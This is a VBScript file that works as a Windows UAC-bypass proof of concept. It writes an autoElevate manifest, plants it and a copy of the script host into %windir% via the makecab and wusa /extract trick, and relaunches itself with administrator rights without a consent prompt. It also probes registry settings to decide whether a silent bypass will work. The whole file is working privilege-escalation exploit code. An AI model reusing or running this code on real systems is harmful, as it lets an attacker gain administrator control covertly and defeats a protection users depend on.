Option Explicit

Dim HOST_MANIFEST: HOST_MANIFEST = _
    "<?xml version=""1.0"" encoding=""UTF-8"" standalone=""yes""?>" & vbCrLf & _
    "<assembly xmlns=""urn:schemas-microsoft-com:asm.v1""" & vbCrLf & _
    "          xmlns:asmv3=""urn:schemas-microsoft-com:asm.v3""" & vbCrLf & _
    "          manifestVersion=""1.0"">" & vbCrLf & _
    "  <asmv3:trustInfo>" & vbCrLf & _
    "    <security>" & vbCrLf & _
    "      <requestedPrivileges>" & vbCrLf & _
    "        <requestedExecutionLevel level=""RequireAdministrator"" uiAccess=""false""/>" & vbCrLf & _
    "      </requestedPrivileges>" & vbCrLf & _
    "    </security>" & vbCrLf & _
    "  </asmv3:trustInfo>" & vbCrLf & _
    "  <asmv3:application>" & vbCrLf & _
    "    <asmv3:windowsSettings xmlns=""http://schemas.microsoft.com/SMI/2005/WindowsSettings"">" & vbCrLf & _
    "      <autoElevate>true</autoElevate>" & vbCrLf & _
    "      <dpiAware>true</dpiAware>" & vbCrLf & _
    "    </asmv3:windowsSettings>" & vbCrLf & _
    "  </asmv3:application>" & vbCrLf & _
    "</assembly>"

Function CanBypass()
    Dim KEY_NAME: KEY_NAME = _
        "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\" & _
        "Policies\System\ConsentPromptBehaviorAdmin"
    Dim oWs: Set oWs = CreateObject("WScript.Shell")
    CanBypass = Not CBool(oWs.RegRead(KEY_NAME) And 2)
End Function

Sub Copy(ByVal sSource, ByVal sTarget)
    Dim oFso: Set oFso = CreateObject("Scripting.FileSystemObject")
    Dim oWs: Set oWs = CreateObject("WScript.Shell")
    Dim sTempFile: sTempFile = GetTempFilename()
    oWs.Run "makecab """ & sSource & """ """ & sTempFile & """", 0, True
    oWs.Run "wusa """ & sTempFile & """ /extract:" & sTarget, 0, True
    oFso.DeleteFile sTempFile
End Sub

Sub Elevate()
    Const WINDIR = "%windir%"
    If Not CanBypass() Then
        Message "User will get warnings...", vbInformation
        ' Exit Sub
    End If
    Dim oWs: Set oWs = CreateObject("WScript.Shell")
    Dim sPath: sPath = Left(WScript.ScriptFullName, _
                            InStrRev(WScript.ScriptFullName, "\"))
    Dim sHost: sHost = Right(WScript.FullName, 11)
    Dim sManifest: sManifest = sPath & sHost & ".manifest"
    Dim oFso: Set oFso = CreateObject("Scripting.FileSystemObject")
    Dim oStream: Set oStream = oFso.CreateTextFile(sManifest)
    oStream.Write HOST_MANIFEST
    oStream.Close
    Copy sManifest, WINDIR
    Copy WScript.FullName, WINDIR
    oWs.Run WINDIR & "\" & sHost & " """ & WScript.ScriptFullName & """ /RESTART"
    oFso.DeleteFile sManifest
End Sub

Function GetTempFilename()
    Const vbTemporaryFolder = 2
    Dim oFso: Set oFso = CreateObject("Scripting.FileSystemObject")
    Dim sTempFolder: sTempFolder = oFso.GetSpecialFolder(vbTemporaryFolder)
    GetTempFilename = oFso.BuildPath(sTempFolder, oFso.GetTempName())
End Function

Function HasAdmin()
    Const VALUE = "RandomValue"
    Const KEYNAME = "HKLM\SOFTWARE\Microsoft\RandomKey"
    On Error Resume Next : Err.Clear
    Dim oWs: Set oWs = CreateObject("WScript.Shell")
    oWs.RegWrite KEYNAME, VALUE
    Call oWs.RegRead(KEYNAME)
    oWs.RegDelete KEYNAME
    HasAdmin = CBool(Err.Number = 0) 
End Function

Function Message(ByVal sMessage, ByVal iFlags)
    Message = MsgBox(sMessage, vbSystemModal Or iFlags, WScript.ScriptName)
End Function

Sub RunAsAdmin()
    If HasAdmin() Then
        Message "Elevated to admin, ...", vbInformation
    Else
        Message "Failed... no admin", vbExclamation
    End If
End Sub

If WScript.Arguments.Named.Exists("RESTART") Then
    RunAsAdmin
ElseIf HasAdmin() Then
	Message "U Wot M8? This is a elevation test and we're already admin!", vbCritical
Else
    Elevate
End If